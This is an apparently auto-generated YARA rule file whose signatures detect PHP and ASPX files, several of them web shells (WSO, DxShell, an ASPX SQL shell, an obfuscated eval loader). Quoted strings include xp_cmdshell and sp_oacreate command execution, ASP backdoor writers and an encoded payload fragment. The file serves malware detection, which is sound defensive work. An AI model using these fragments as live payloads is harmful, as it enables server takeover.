      $s12 = "$n='ounXt($m[1]);$XXz++)$p.=$q[$m[2][$XzX]];if(strpXXos($p,X$h)===0){$s[$XXi]=\"\"';" fullword ascii
      $s13 = "$q='5($iX.$XXkh),0,3))X;$f=X$sXl($ss(mXd5($i.$kf),0,3));$Xp=\"X\";for(X$z=1;X$z<Xc';" fullword ascii
      $s14 = "$F=';$o=X\"\";for($Xi=X0;$i<$l;){for(X$j=X0;($jX<X$cX&&$i<$l);$jXX++,$i++){$Xo.=$t';" fullword ascii
      $s15 = "$M=str_replace('X','',$u.$F.$K.$Q.$I.$g.$e.$q.$n.$W.$H.$j.$E.$k);" fullword ascii
      $s16 = "$i=str_replace('Q','','QcreQatQe_fQuQQnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule admin_menu_import_export_html
{
   meta:
      description = "php17 - file admin-menu-import-export.html.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e23f52461d28892cadb5c26fd014e852fb6d88a0f3b9712549781b2116644247"
   strings:
      $s1 = "echo \"postboxes.add_postbox_toggles('nf_import_export_$active_tab');\"; //For WP2.7 and above" fullword ascii
      $s2 = "<a href=\"<?php echo add_query_arg( 'tab', $tab );?>\" target=\"\" class=\"nav-tab \"><?php echo $name ?></a>" fullword ascii
      $s3 = "echo \"add_postbox_toggles('nf_import_export_$active_tab');\"; //For WP2.6 and below" fullword ascii
      $s4 = "// close postboxes that should be closed" fullword ascii
      $s5 = "<?php do_meta_boxes('nf_import_export_' . $active_tab, 'advanced', NULL ); ?>" fullword ascii
      $s6 = "if(version_compare($wp_version,\"2.7-alpha\", \"<\")){" fullword ascii
      $s7 = "<h1><?php _e( 'Import / Export', 'ninja-forms' ); ?></h1>" fullword ascii
      $s8 = "// postboxes" fullword ascii
      $s9 = "<?php foreach( $tabs as $tab => $name ): ?>" fullword ascii
      $s10 = "<span class=\"nav-tab nav-tab-active\"><?php echo esc_html( $name ) ?></span>" fullword ascii
      $s11 = "<?php if( $tab == $active_tab ): ?>" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 3KB and
      8 of them
}

rule sig_99a549eaba203e1a4f972811cc417f693ab4be4c
{
   meta:
      description = "php17 - file 99a549eaba203e1a4f972811cc417f693ab4be4c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e16ceb2d3015fbe3fa042c6b021e91fa6fd118bd3e64fe28f78b84c13a9648e1"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\"; " fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { " fullword ascii
      $x3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x4 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); " fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true; " fullword ascii
      $x6 = "/* WSO 2.6 (404 Error Web Shell by Madleets.com) */" fullword ascii
      $x7 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login ->" fullword ascii
      $x8 = "<input type='button' value='hashcrack.com' onclick=\\\"document.hf.action='http://www.hashcrack.com/index.php';documen" fullword ascii
      $x9 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); " fullword ascii
      $x10 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) " fullword ascii
      $x11 = "print \"<font color='green'>[+] Exploitable!</font> <a href=\\\"\".$target.\"\".$lfitest.\"\\\">\".$target.\"\".$lfitest.\"</" fullword ascii
      $s12 = "<input type='button' value='md5decrypter.com' onclick=\\\"document.hf.action='http://www.md5decrypter.com/';document.h" fullword ascii
      $s13 = "wsoSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s14 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfierror[$x].\"\\\">\".$target.\"\".$lfie" fullword ascii
      $s15 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lficonfig[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s16 = "$m = array('Sec Info'=>'SecInfo','Files'=>'FilesMan','Exec'=>'Console','Sql'=>'Sql','PHP Tools'=>'phptools','LFI'=>'lfiscan'" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { " fullword ascii
      $s18 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch'); " fullword ascii
      $s19 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr> " fullword ascii
      $s20 = "39 => \"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log\".$byte1.\"\", " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule php17_aspx
{
   meta:
      description = "php17 - file aspx.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d751596d86cd490a9dc76036210ede2f5dd14454461c8e509e1bbe439184279e"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
      $x2 = "href=\"http://alikaptanoglu.blogspot.com\" target=\"_blank\">Shell sql tool</a> All Rights Reserved.</div></div>" fullword ascii
      $x3 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
      $x4 = "<input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $x5 = ":ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /" ascii
      $x6 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
      $x7 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));" fullword ascii
      $x8 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x9 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r\\n-" ascii
      $x10 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
      $x11 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID\"].ToString()+\"')\\\">Kill</a>\";" fullword ascii
      $x12 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+\"')\\\">\"+rootkey+\"</a> | \";" fullword ascii
      $x13 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $x14 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70" ascii
      $x15 = "WORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell(&#34;cm" ascii
      $x16 = "Bin_H2_Title.InnerText=\"Execute Command >>\";" fullword ascii
      $x17 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(Reg_Path+innerSubKey)+\"')\\\">\"+innerSubKey+\"</a>\";" fullword ascii
      $s18 = "lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\\bin.asp' backup database @b" ascii
      $s19 = "utfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''\">SP_makewebtask make file</asp:Lis" ascii
      $s20 = "echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:ListItem Value=\"sp_makewebtask @ou" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule adminer_4_2_4_2
{
   meta:
      description = "php17 - file adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $x1 = "as$x=>$X){if($x!=\"\"&&$X>1){echo($Kc?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$x%\").\"'>\".h($x).\"</a>\";$Kc=" ascii
      $x2 = "as$_d=>$X){if($X[0]<$ih)unset($zd[$_d]);}}$yd=&$zd[$b->bruteForceKey()];if(!$yd)$yd=array($ih+30*60,0);$yd[1]++;$wg=serialize($z" ascii
      $x3 = "as$m=>$S){$gg=h(ME).\"db=\".urlencode($m);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db[]\",$m,in_array(" ascii
      $x4 = "false;}set_error_handler(array($this,'_error'));$J=@oci_execute($I);restore_error_handler();if($J){if(oci_num_fields($I))return" fullword ascii
      $x5 = "connect_error(){global$b,$h,$T,$n,$Xb;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header(lang(35).\": \".h(DB),lang(101" ascii
      $x6 = "EmailProcess($Z,$Oc)){if($_POST[\"save\"]||$_POST[\"delete\"]){$I=true;$za=0;$O=array();if(!$_POST[\"delete\"]){foreach($f" fullword ascii
      $x7 = "';if(!$K[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $x8 = "password_file($j){$Ic=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Ic);if($J||!$j)return$J;$Sc=@fopen($Ic,\"w\");if($S" ascii
      $x9 = "password_file($j){$Ic=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Ic);if($J||!$j)return$J;$Sc=@fopen($Ic,\"w\");if($S" ascii
      $x10 = "as$V=>$G){if($G!==null){if($Kc){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$Kc=" ascii
      $x11 = "\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privileges\"])||isse" ascii
      $s12 = "as$X){if($X[1]!=\"USAGE\")$Wc[\"$B[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$K[0]))$Wc[\"$B[2]$X[2]\"][\"GRAN" ascii
      $s13 = "doc_link($rf){global$w,$h;$Mh=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($h->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $s14 = "';}elseif(isset($_GET[\"dump\"])){$a=$_GET[\"dump\"];if($_POST&&!$n){$_b=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $s15 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s16 = "name(){return\"<a href='https://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s17 = "add_invalid_login(){global$b;$Ic=get_temp_dir().\"/adminer.invalid\";$Sc=@fopen($Ic,\"r+\");if(!$Sc){$Sc=@fopen($Ic,\"w\");if(!$" ascii
      $s18 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s19 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s20 = "* @license http://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule ActiveRecordSpecialEvent
{
   meta:
      description = "php17 - file ActiveRecordSpecialEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4b86361824d538bb670e0f00153591958f37ad1683719ba2e6bd497b5ff5f503"
   strings:
      $s1 = "* @return array Array of event data that will be passed though application or through js" fullword ascii
      $s2 = "/** @var \\yii\\db\\ActiveRecord model */" fullword ascii
      $s3 = "public $modelInstanceNeeded = false;" fullword ascii
      $s4 = "namespace app\\modules\\core\\events;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_2c60_2c7f
{
   meta:
      description = "php17 - file 2c60_2c7f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0602d57ad3acaf7f6ef49c0537c824e17895b72d0809bb2a0cda09b9c8a45b6"
   strings:
      $s1 = "*     Note that the Turkic mappings do not maintain canonical equivalence without additional processing." fullword ascii
      $s2 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s3 = "* CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s4 = "* @see http://www.unicode.org/Public/UNIDATA/CaseFolding.txt" fullword ascii
      $s5 = "* @see http://www.unicode.org/Public/UNIDATA/UCD.html" fullword ascii
      $s6 = "* C: common case folding, common mappings shared by both simple and full mappings." fullword ascii
      $s7 = "*   - For Turkic languages (tr, az), this mapping can be used instead of the normal mapping for these characters." fullword ascii
      $s8 = "* @license       MIT License (http://www.opensource.org/licenses/mit-license.php)" fullword ascii
      $s9 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s10 = "* The lower filed is an array of the decimal values that form the lower case version of a character." fullword ascii
      $s11 = "$config['2c60_2c7f'][] = array('upper' => 11381, 'status' => 'C', 'lower' => array(11382));" fullword ascii
      $s12 = "* F: full case folding, mappings that cause strings to grow in length. Multiple characters are separated by spaces." fullword ascii
      $s13 = "*   - For non-Turkic languages, this mapping is normally not used." fullword ascii
      $s14 = "* Provides case mapping of Unicode characters for code points U+2C60 through U+2C7F" fullword ascii
      $s15 = "* Redistributions of files must retain the above copyright notice." fullword ascii
      $s16 = "* S: simple case folding, mappings to single characters where different from F." fullword ascii
      $s17 = "* Licensed under The MIT License" fullword ascii
      $s18 = "*     See the discussions of case mapping in the Unicode Standard for more information." fullword ascii
      $s19 = "* The upper field is the decimal value of the upper case character" fullword ascii
      $s20 = "* @link          http://cakephp.org CakePHP(tm) Project" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_85f5db4b8f7e4d9a4991087250f96b0259c0e7e0
{
   meta:
      description = "php17 - file 85f5db4b8f7e4d9a4991087250f96b0259c0e7e0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab020357064518478b32f5297146d30e1ff9f5ea711de979d82bb8c22bcbbdc3"
   strings:
      $x1 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Jo" ascii
      $x2 = "$DxDOWNLOAD_File['content'].=\"\\n\\t\".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';" fullword ascii
      $x3 = "foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.\";\";" fullword ascii
      $x4 = "$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';" fullword ascii
      $x5 = "print \"\\n\\t\".'<input type=text name=\"DxFTP_FTP\" value=\"ftp.host.com[:21]\" style=\"width:100%;\">';" fullword ascii
      $x6 = "function DxExecNahuj($cmd, &$OUT, &$RET)" fullword ascii
      $x7 = "Url'])?$_POST['DxProx_Url']:'http://www.microsoft.com:80/index.php?get=q&get2=d').'\" style=\"width:100%;\"></td></tr>';" fullword ascii
      $x8 = "((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND" fullword ascii
      $x9 = "function DxHTTPMakeHeaders($method='', $URL='', $host='', $user_agent='', $referer='', $posts=array(), $cookie=array())" fullword ascii
      $x10 = "if (!ftp_login($FTP, $_POST['DxFTP_USER'], $_POST['DxFTP_PASS'])) die(DxError('Login failed'));" fullword ascii
      $x11 = "@$_COOKIE['DxS_AuthC']==md5($GLOB['SHELL']['USER']['Login'].$GLOB['SHELL']['USER']['Passw'])" fullword ascii
      $x12 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/plain');" fullword ascii
      $x13 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.$DxDOWNLOAD_File['filename'].'\";');" fullword ascii
      $x14 = "host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'\" style=\"width:100%;\">';" fullword ascii
      $x15 = "$DxDOWNLOAD_File['content'].=\"\\n\".'INSERT INTO `'.$CUR_TABLE.'` VALUES (\"'.implode('\", \"', $DUMP[$i]).'\");';" fullword ascii
      $x16 = "T['DxMailer_TO']))?'tristam@mail.ru'.\"\\n\".'billy@microsoft.com':$_POST['DxMailer_TO']  ).'</textarea></td></tr>';" fullword ascii
      $x17 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.basename($_GET['dxfile']).'\";');" fullword ascii
      $s18 = "document.getElementById(\"LolBox\").value = contents + tl[index].substring(0,text_pos)+'|';" fullword ascii
      $s19 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/comma-separated-values');" fullword ascii
      $s20 = "r_FROM']))?'DxS <admin@'.$_SERVER['HTTP_HOST']:$_POST['DxMailer_FROM']  ).'>\" style=\"width:100%;\"></td></tr>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule AbstractQuestionHelperTest
{
   meta:
      description = "php17 - file AbstractQuestionHelperTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d7c6522805c0ea62b46dfda6c6f157f3071dcb9e7db341a957cf2220548736b0"
   strings:
      $s1 = "protected function createStreamableInputInterfaceMock($stream = null, $interactive = true)" fullword ascii
      $s2 = "use Symfony\\Component\\Console\\Input\\StreamableInputInterface;" fullword ascii
      $s3 = "$mock = $this->getMockBuilder(StreamableInputInterface::class)->getMock();" fullword ascii
      $s4 = "namespace Symfony\\Component\\Console\\Tests\\Helper;" fullword ascii
      $s5 = "->method('getStream')" fullword ascii
      $s6 = "->will($this->returnValue($interactive));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php17_16csv
{
   meta:
      description = "php17 - file 16csv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3f2eb996c8de468631d1d328d738dd489ac7d477464e147c1f549605103bdd95"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '_excel.csv', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s9 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.csv', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s10 = "$objPHPExcelFromCSV = $objReader->load(str_replace('.php', '.csv', __FILE__));" fullword ascii
      $s11 = "/** Error reporting */" fullword ascii
      $s12 = "$objReader = PHPExcel_IOFactory::createReader('CSV')->setDelimiter(',')" fullword ascii
      $s13 = "$objWriterCSV->save(str_replace('.php', '_excel.csv', __FILE__));" fullword ascii
      $s14 = "echo 'Files have been created in ' , getcwd() , EOL;" fullword ascii
      $s15 = "$objWriter2007 = PHPExcel_IOFactory::createWriter($objPHPExcelFromCSV, 'Excel2007');" fullword ascii
      $s16 = "* @version    ##VERSION##, ##DATE##" fullword ascii
      $s17 = "$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'CSV')->setDelimiter(',')" fullword ascii
      $s18 = "$objWriter2007->save(str_replace('.php', '.xlsx', __FILE__));" fullword ascii
      $s19 = "$objWriterCSV = PHPExcel_IOFactory::createWriter($objPHPExcelFromCSV, 'CSV');" fullword ascii
      $s20 = "$callTime = $callEndTime - $callStartTime;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule _files_tpl
{
   meta:
      description = "php17 - file _files.tpl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3ffbff585234593ebc45d2d4b90a8f2abce47cf682d7aecd28d4663db22ecfd5"
   strings:
      $s1 = "<td style=\"width: 20em;\">{name}</td>" fullword ascii
      $s2 = "{userFiles}" fullword ascii
      $s3 = "{/userFiles}" fullword ascii
   condition:
      uint16(0) == 0x743c and filesize < 1KB and
      all of them
}

rule _ui_toolbar
{
   meta:
      description = "php17 - file _ui_toolbar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "89772f03761d93c22c455fbc7ec49909870c4926eb6f7bb0e824b703afaffeb9"
   strings:
      $s1 = "<?= @helper('ui.commands', $toolbar->getCommands()->class('btn btn-primary')) ?>" fullword ascii
      $s2 = "<? defined('KOOWA') or die('Restricted access');?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_77bfdf1704f1a821317bcda08e140fb5
{
   meta:
      description = "php17 - file 77bfdf1704f1a821317bcda08e140fb5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b61e2126ded9637ec91e8950552b73ab87f6d38985db084b2c4eb730b0cfc02e"
   strings:
      $x1 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s2 = "$this->getConfig()->downloader_path . DS ." fullword ascii
      $s3 = "public function getConfig($fileName = 'connect.cfg')" fullword ascii
      $s4 = "$this->runCommand($cmd['name'], $cmd['options'], $cmd['params']);" fullword ascii
      $s5 = "$libPath = PS . BP . DS . 'downloader' . DS . 'lib';" fullword ascii
      $s6 = "public function runCommand($cmd, $options, $params)" fullword ascii
      $s7 = "chdir(BP . DS . 'downloader' . DS);" fullword ascii
      $s8 = "$this->validCommands = array_keys($this->commands);" fullword ascii
      $s9 = "$config->magento_root = dirname(dirname(__FILE__));" fullword ascii
      $s10 = "list($options,$params) = $this->parseCommandArgs($argv);" fullword ascii
      $s11 = "if (empty($config->magento_root)) {" fullword ascii
      $s12 = "$c = Mage_Connect_Command::getInstance($cmd);" fullword ascii
      $s13 = "$this->getConfig()->magento_root . DS ." fullword ascii
      $s14 = "$this->frontend->outputCommandList($this->commands);" fullword ascii
      $s15 = "Mage_Connect_Command::setFrontendObject($frontend);" fullword ascii
      $s16 = "Mage_Connect_Command::setSconfig($this->_sconfig);" fullword ascii
      $s17 = "define('MAGENTO_ROOT', dirname(dirname(__FILE__)));" fullword ascii
      $s18 = "if(in_array($argv[1], $this->validCommands)) {" fullword ascii
      $s19 = "$cmd = $this->detectCommand();" fullword ascii
      $s20 = "Mage_Connect_Command::setConfigObject($config);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_5a96766d990c9e6c6688cb042bc562be
{
   meta:
      description = "php17 - file 5a96766d990c9e6c6688cb042bc562be.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "06c7e9a0db53008f7e8c3fb4ef028b7445df4dbbb638570a805b61bf2e8ee30f"
   strings:
      $x1 = "eval(\"?>\".gzuncompress(base64_decode(\"eJzlvWtXG8cSKPrZe638h2ainZFiISRhZzuABBiDjWODw8NPfJSRNJImjDTKzAiBHf77qap+TPc8hLB39ll3Xbw" ascii
      $s2 = "sS2zknNckXtCcOolZKxkfPmLM3vKtIZCkUNPSLjmwg674mieiGQTa2AdpIAJpSgnaWVBw12H6RmIIoa7SXtemp9wII2qHa8t11HUwd0zPXIpK+O2Lr5SojUj7upJlYjM" ascii
      $s3 = "SJR/CNJhIMD79iz5vikxZdspapBCWhoFBCSYGVvK3SZLWBH0A6EF2VVAYTwNpy2Ch0By37R5sFkx5sJZctewjcWJqGAfu9IIMyLoGU/iTEf261Sh7+lVKHiZaI+VT683" ascii
      $s4 = "t7TcJuyFhqKspdk3YbEGJJwUtGKLQjCZ8allV9WabKyeJeMUKnpxnNZDw+PleZbZa1Ky15+aiuGxJFvKnZKk0BxFgEt2QxsJhE0nR9I4lUdjkSuUKtgMSU7LF/XS55Ey" ascii
      $s5 = "S/oeZ6X6rzhAd7+S8ij4NZb0S4zxB34TT9r1bq9r2Y6tz/r7dH2u4R+mfUJGURIUKQiKBryESAMdR5jEN1KW/J2Eu9AA8Nk9Z/yBN6OYd0hzukL+WPvlxcikXYUu7m9/" ascii
      $s6 = "lfPitbtVz4cqVmVazCKiIsIjyyc1Cfnv7+qrDwdFhc8k0QwbnMXVQ86HnF5Y9DB04gVs448m6HeYuqDZw32SVAeCo6a5N8oPAiFGMzCFZk1nciNmS25sa9NeEshNNG26" ascii
      $s7 = "TOLhxdunjkN3kDw3VA3aRa0BK6OsVKayQQuP3KV8c0veKXq1CTvF+9RQ74dbgQilsTbd4a6g6rvSUdVsWFIR7xONnC6RUtNwDrHmS07Vo5rzu3F/oUVrgl7daarKn43m" ascii
      $s8 = "EspHIhTsFKatP5wolALdRgUzMhjWT5XivEicTVRjFJZHeTpiBNJCkEy5NVgI+I6oIU2xkBW4B95m7CdOgUcVlE9yCwGC8ROQDxYzR2PD/s3U2jBpwiMYPmHhSmsCKjD3" ascii
      $s9 = "5ZwqTGWQ6VGadvEcIkYJ+OVhf/cOMtGrTcg5bY70TdjeZ/anX419DPUQqHPjtIMiZkRdWRQsmoNXT6XiCsVNCJT1YKR0l+PG/r93JbawJDISHqCEmA8rwojqSrvjuINx" ascii
      $s10 = "y0ZeHbH0zLwgwjfSsZqawbuGY+x9zl4U/YqRtjbKAoKYJBTmRwlPyyFD9lV4IYBXEFiEKaFQ4prm25Pcsb3YLTx5vRNHEFNbX3MqqOOCPcN6qODN6UVm6SMbbuFyRUnD" ascii
      $s11 = "qLuDq/zEZZxKbrJDRu4HVVGIgijMsidCiXtdRaTC1uUYr9xslDOxcx1WV7qvXqL3y2y/v0fESyhTVAko9mnaPBi1rJHjruNbQMaMf5f4132+7QA4YjVjpZ2Yir6I7Q2e" ascii
      $s12 = "W3d3x+dFb+me6cJkpNJxi/XUkuAuQ0z/H05G6S8iKQj0jGGdGW/Fe9d0RTMpHRRKXqkdas58+FBd2nQ1Yb+JxDkoAOQHcycY7d3rDYVjR2fL9d/lqafLJBgLrFMycl8R" ascii
      $s13 = "tTkcomzph/a+vZ0awLg8iuHH/mtux2225vrSFm+ANUti3VJFyLXoRTA2f1KQ7gp3H/cXplvoBugNkN8xtaC2WYWL+Km1TY33+zMpOosNs+2ZgBpdhPP7EyR2qmt1pMxw" ascii
      $s14 = "<?php" fullword ascii
      $s15 = "QPPQZjOk0zVOeJSM4r9qahlmFcp0cR3VRsxygIKZgVfUgu/8SVcCNtH5Uzlql3WVaiTvnT7uqXzw8rnfJF/2vjtrJCc1MLH8ZKBCxti42qedanBkCRL6b43vwsVVAiCK" ascii
      $s16 = "QfN7D4D//yBuUVdzyNb8qlzun+ydv9k0/2i7OzN51z+NbZfb5/dGZ/rlTY1x/+hZSXoJ5wd+hOYqTZCUPnpmw9D4Kh71pVZp36s3CKH16fHj0NYvzkOR0n7I28KzfErx" ascii
      $s17 = "QNOKGimrglgKiV8WoFLK8vbYWhQkTwN63l0UsexnPbT+/Qfl8PCLr5i7ZaJ9RgN6rp/bC+Xv+lqEGiNG9S6Ebf06bp8LvbhO+ZtpiFz//R6dTDsynDAvQVP2ACvrdHCY" ascii
      $s18 = "s3eqdRoFAODhz26NksfMOUtHkbRXwBSc2Jiae5YcxFmEJtUSFqfTnJcBiFQfNETE39qrCRvUoUd4KP6//mYdsemJGb7Qak48MbG4lmSF8SSJUtmQ19FgOfPJGhnz/0Gu" ascii
      $s19 = "ZwJhuU7X83as0B6tIjtqbBsgqeqJ4/taU+XMP36Mnj//yyDDICZPxw9joX1XJEITmE5LcEiVasxE+JT/NFdjo18iUm1gp8YT+x+vVeHQ+erZb8WPJwSUUanQnsbgK7m8" ascii
